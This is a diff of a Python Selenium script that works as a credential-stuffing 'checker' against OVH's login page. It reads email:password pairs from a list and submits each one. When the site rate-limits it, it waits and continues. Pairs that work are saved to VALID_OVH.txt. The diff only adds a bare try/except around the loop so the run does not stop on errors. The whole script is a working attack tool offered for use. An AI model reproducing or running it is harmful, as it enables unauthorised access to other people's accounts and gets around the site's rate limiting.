@@ -51,26 +51,29 @@ driver = webdriver.PhantomJS("C:\\Selenium\\phantomjs-2.1.1-windows\\bin\\phanto
 for line in file:
 	count = count + 1
 	line = line.strip()
-	line = line.split(':')
-	email = line[0]
-	passwd = line[1]
-	driver.get('https://www.ovh.com/auth/')
-	if 'Too many authentication failures' in driver.page_source:
-		print '{} {}[+] '.format(yl, yl) + '(' + str(count) + ') ' + ' => [ + BANNED + ]'.format(yl, yl)
-		time.sleep(500)
+	try:
+		line = line.split(':')
+		email = line[0]
+		passwd = line[1]
 		driver.get('https://www.ovh.com/auth/')
-	else:
-		driver.find_element_by_xpath('//*[@class="pagination-centered"]/div/div/input').send_keys(email)
-		driver.find_element_by_xpath('//*[@class="pagination-centered"]/div[2]/div/input').send_keys(passwd)
-		driver.find_element_by_xpath('//button[@class="btn"]').click()
-		if 'Invalid Account ID or password' in driver.page_source:
-			print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + passwd + ' => [ + INVALID + ]'.format(rd, rd)
+		if 'Too many authentication failures' in driver.page_source:
+			print '{} {}[+] '.format(yl, yl) + '(' + str(count) + ') ' + ' => [ + BANNED + ]'.format(yl, yl)
+			time.sleep(500)
+			driver.get('https://www.ovh.com/auth/')
 		else:
-			print '{} {}[+] '.format(gr, gr) + '(' + str(count) + ') ' + email + ':' + passwd + ' => [ + VALID + ]'.format(gr, gr)
-			valid = open('VALID_OVH.txt', 'a+')
-			valid.write('[+] [ ' + email + ':' + passwd + ' ] => [ + VALID + ] \n')
-			valid.close()
-			time.sleep(5)
-			driver.find_element_by_xpath('//span[@class="oui-icon navbar-icon-user"]').click()
-			driver.find_element_by_xpath('//button[@class="oui-navbar-link"]').click()
-# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
+			driver.find_element_by_xpath('//*[@class="pagination-centered"]/div/div/input').send_keys(email)
+			driver.find_element_by_xpath('//*[@class="pagination-centered"]/div[2]/div/input').send_keys(passwd)
+			driver.find_element_by_xpath('//button[@class="btn"]').click()
+			if 'Invalid Account ID or password' in driver.page_source:
+				print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + passwd + ' => [ + INVALID + ]'.format(rd, rd)
+			else:
+				print '{} {}[+] '.format(gr, gr) + '(' + str(count) + ') ' + email + ':' + passwd + ' => [ + VALID + ]'.format(gr, gr)
+				valid = open('VALID_OVH.txt', 'a+')
+				valid.write('[+] [ ' + email + ':' + passwd + ' ] => [ + VALID + ] \n')
+				valid.close()
+				time.sleep(5)
+				driver.find_element_by_xpath('//span[@class="oui-icon navbar-icon-user"]').click()
+				driver.find_element_by_xpath('//button[@class="oui-navbar-link"]').click()
+	# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
+	except:
+		pass
